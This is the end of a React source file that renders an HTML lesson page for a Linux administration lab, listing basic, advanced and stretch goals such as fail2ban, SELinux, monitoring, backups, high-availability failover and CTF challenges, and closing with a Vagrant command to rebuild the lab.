class=\"hl\">✓</span> auditd captures a sudo command<br>\n          <span class=\"hl\">✓</span> fail2ban bans lab-attacker after 5 SSH fails<br>\n          <span class=\"hl\">✓</span> pg_dump restore completes successfully\n        </div>\n      </div>\n      <div class=\"cb cby\">\n        <div class=\"cbt\">Advanced (Aim For)</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hy\">→</span> Complete all 4 CTF challenges<br>\n          <span class=\"hy\">→</span> Full enterprise stack deployed and monitored<br>\n          <span class=\"hy\">→</span> Complete disaster recovery in under 10 minutes<br>\n          <span class=\"hy\">→</span> All 10 lab exercises documented with findings<br>\n          <span class=\"hy\">→</span> Red team attack detected and blocked before flag<br>\n          <span class=\"hy\">→</span> Ansible playbook that deploys and hardens lab-web from scratch\n        </div>\n      </div>\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">Expert (Stretch Goals)</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hr\">★</span> SELinux in enforcing mode, 0 AVC denials in steady state<br>\n          <span class=\"hr\">★</span> Full Prometheus alerting fires correctly under load<br>\n          <span class=\"hr\">★</span> HA failover: kill lab-lb, traffic still flows<br>\n          <span class=\"hr\">★</span> LUKS encryption on lab-db data partition<br>\n          <span class=\"hr\">★</span> CI/CD pipeline deploys app from git push to lab-web<br>\n          <span class=\"hr\">★</span> Grafana dashboard visible publicly via nginx reverse proxy\n        </div>\n      </div>\n    </div>\n\n    <div style=\"background:linear-gradient(135deg,rgba(0,255,136,.1),rgba(0,212,255,.06));border:2px solid rgba(0,255,136,.4);padding:20px 24px;text-align:center\">\n      <div style=\"font-family:var(--sans);font-size:22px;font-weight:700;color:var(--g);margin-bottom:8px\">🐧 Lab Complete = Linux Mastered</div>\n      <div style=\"font-size:12px;color:var(--t2);line-height:1.8;max-width:700px;margin:0 auto\">\n        When you can spin up this lab from scratch in under 2 hours, pass all automated tests, exploit and patch the CTF challenges, survive a simulated breach, and recover from disaster — you have achieved <strong style=\"color:var(--g)\">production-grade Linux proficiency</strong>.<br><br>\n        The lab is yours to break and rebuild as many times as you need. <code>vagrant destroy -f && vagrant up</code> gives you a clean slate in minutes.\n      </div>\n      <div style=\"display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:14px\">\n        <span class=\"tag tg\" style=\"font-size:12px;padding:5px 12px\">🔒 Secure</span>\n        <span class=\"tag tc\" style=\"font-size:12px;padding:5px 12px\">⚡ Performant</span>\n        <span class=\"tag ty\" style=\"font-size:12px;padding:5px 12px\">📊 Monitored</span>\n        <span class=\"tag tp\" style=\"font-size:12px;padding:5px 12px\">🤖 Automated</span>\n        <span class=\"tag to\" style=\"font-size:12px;padding:5px 12px\">💾 Backed Up</span>\n        <span class=\"tag tr2\" style=\"font-size:12px;padding:5px 12px\">🚩 CTF Ready</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n</div>";

export default function LinuxLabSetup() {
  return <LessonDocument title="Lab Setup and Test" styles={styles} markup={markup} />;
}
